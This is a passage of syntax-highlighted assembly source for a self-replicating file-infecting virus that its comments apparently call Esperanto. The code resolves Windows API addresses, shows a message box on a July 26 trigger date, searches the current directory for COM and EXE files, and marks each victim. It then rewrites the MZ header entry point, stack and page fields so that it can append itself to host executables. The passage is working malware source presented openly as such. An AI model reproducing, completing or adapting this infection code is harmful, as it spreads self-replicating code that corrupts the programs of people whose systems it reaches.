                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gpaddress_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">jump_to_host</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">find_more_api</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Payload checking routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

                </span><span class="sc1">; Now it's time to check for our activation</span><span class="sc0">
                </span><span class="sc1">; date (july 26th, when, in 1887, the first</span><span class="sc0">
                </span><span class="sc1">; book written in Esperanto, "Internacia</span><span class="sc0">
                </span><span class="sc1">; Lingvo", was published), so we first use</span><span class="sc0">
                </span><span class="sc1">; the API GetLocalTime to get the date</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time_table</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">glocaltime_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Check for july</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_month</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_first</span><span class="sc0">

                </span><span class="sc1">; Now check for the 26th</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">system_day</span><span class="sc4">],</span><span class="sc2">1ah</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_first</span><span class="sc0">

                </span><span class="sc1">; At this point we're sure about the fact</span><span class="sc0">
                </span><span class="sc1">; that today is our activation date, so</span><span class="sc0">
                </span><span class="sc1">; we call the API LoadLibraryA in order</span><span class="sc0">
                </span><span class="sc1">; to load the USER32.DLL module (for the</span><span class="sc0">
                </span><span class="sc1">; case our host does not load it)</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32_n</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loadlibrary_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">jump_to_host</span><span class="sc0">

                </span><span class="sc1">; Next step consists on decrypting the</span><span class="sc0">
                </span><span class="sc1">; internal text used in the payload,</span><span class="sc0">
                </span><span class="sc1">; which is hidden behind a stupid "not"</span><span class="sc0">
                </span><span class="sc1">; encryption... just do it (Nike) :P</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">text_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">text_start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">decrypt_text</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_text</span><span class="sc0">

                </span><span class="sc1">; Once this is done, it's necessary to</span><span class="sc0">
                </span><span class="sc1">; call again GetProcAddress in order to</span><span class="sc0">
                </span><span class="sc1">; get the address of the API MessageBoxA</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">messagebox_n</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gpaddress_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">jump_to_host</span><span class="sc0">

                </span><span class="sc1">; And now we've done almost everything</span><span class="sc0">
                </span><span class="sc1">; in the payload... just call the API,</span><span class="sc0">
                </span><span class="sc1">; show the text and jump to the host (no</span><span class="sc0">
                </span><span class="sc1">; infection in Esperanto's only holiday)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_author</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_text</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jump_to_host</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ File searching routine (FindFirstFileA-based) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

                </span><span class="sc1">; Look for first file in current directory</span><span class="sc0">
                </span><span class="sc1">; by means of the API FindFirstFileA, and</span><span class="sc0">
                </span><span class="sc1">; increment the infection counter byte</span><span class="sc0">

</span><span class="sc5">find_first</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">wildcard</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">findfirst_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jump_to_host</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ File checking routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

                </span><span class="sc1">; Save the handle of the found file and</span><span class="sc0">
                </span><span class="sc1">; check for its size, just to see if it's</span><span class="sc0">
                </span><span class="sc1">; a too small file to be infected</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">srchandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">check_victim</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_next</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],\
</span><span class="sc0">                                                </span><span class="sc2">0fffffc17h</span><span class="sc4">-</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">find_next</span><span class="sc0">

                </span><span class="sc1">; The file size is ok, now let's memory-map</span><span class="sc0">
                </span><span class="sc1">; it and do further checks about its main</span><span class="sc0">
                </span><span class="sc1">; characteristics, to know if it's a good</span><span class="sc0">
                </span><span class="sc1">; file to infect with our viral code</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_map_file</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">find_next</span><span class="sc0">

                </span><span class="sc1">; First of all, check for its extension to</span><span class="sc0">
                </span><span class="sc1">; be COM or EXE. I used a stupid waste of</span><span class="sc0">
                </span><span class="sc1">; bytes here, but i was kinda drunk when i</span><span class="sc0">
                </span><span class="sc1">; did it (check for a dot instead of the end</span><span class="sc0">
                </span><span class="sc1">; of the ASCIIZ string), so i thought it was</span><span class="sc0">
                </span><span class="sc1">; fun not to modify it... it works :)</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">find_dot</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">max_path_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">max_path_size</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_dot</span><span class="sc0">

                </span><span class="sc1">; Is it a COM file?</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'MOC.'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check32_com</span><span class="sc0">

                </span><span class="sc1">; Maybe an EXE file?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Seems so... first check for the MZ mark</span><span class="sc0">
                </span><span class="sc1">; as the first doubleword in the header</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ EXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check32_exe</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Now check for our infection mark (";)")</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_csum</span><span class="sc4">],</span><span class="sc12">');'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; If file has not been infected, then</span><span class="sc0">
                </span><span class="sc1">; set the winky smiley as checksum, and</span><span class="sc0">
                </span><span class="sc1">; check for the number of overlays</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_csum</span><span class="sc4">],</span><span class="sc12">');'</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_ovno</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Don't infect PkLited EXEs</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_res</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Now check for the Windows file mark</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_lfarlc</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check32_pe</span><span class="sc0">

                </span><span class="sc1">; At this point we know it is a DOS EXE</span><span class="sc0">
                </span><span class="sc1">; file... we're gonna infect it for sure</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ EXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">infect32_exe</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_counter</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unmap_close</span><span class="sc0">

                </span><span class="sc1">; Only EXEs &lt; 65535, because of the "div"</span><span class="sc0">
                </span><span class="sc1">; problem referenced in the virus description</span><span class="sc0">
                </span><span class="sc1">; which is found at the start of this file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">unmap_n_close</span><span class="sc0">

                </span><span class="sc1">; Remap the file with our size added</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],\
</span><span class="sc0">                                                </span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_map_file</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_good</span><span class="sc0">

                </span><span class="sc1">; Calculate the new CS by means of first</span><span class="sc0">
                </span><span class="sc1">; getting the size header in paragraphs</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_cparhdr</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Update new CS and store the old one</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exe_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">; And now update the IP pointer, which</span><span class="sc0">
                </span><span class="sc1">; is equal to zero, that is, the start</span><span class="sc0">
                </span><span class="sc1">; of the virus which jumps straight to</span><span class="sc0">
                </span><span class="sc1">; the COM and EXE entry</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_ip</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exe_ip</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc1">; Now calculate SS and SP</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc4">+</span><span class="sc2">320h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">

                </span><span class="sc1">; Update SS</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_ss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exe_ss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">; Update SP</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_sp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">exe_sp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">; Calculate the new number of bytes in last</span><span class="sc0">
                </span><span class="sc1">; page and of pages in EXE file, and update</span><span class="sc0">
                </span><span class="sc1">; the corresponding pointers in the MZ header</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_cblp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_cp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">; And finally append our code to the end of</span><span class="sc0">
                </span><span class="sc1">; the EXE file we've just infected. The MZ</span><span class="sc0">
                </span><span class="sc1">; header will be overwritten to the old one</span><span class="sc0">
                </span><span class="sc1">; as soon as the file is unmapped, no need</span><span class="sc0">
                </span><span class="sc1">; to lseek to the start and write it</span><span class="sc0">

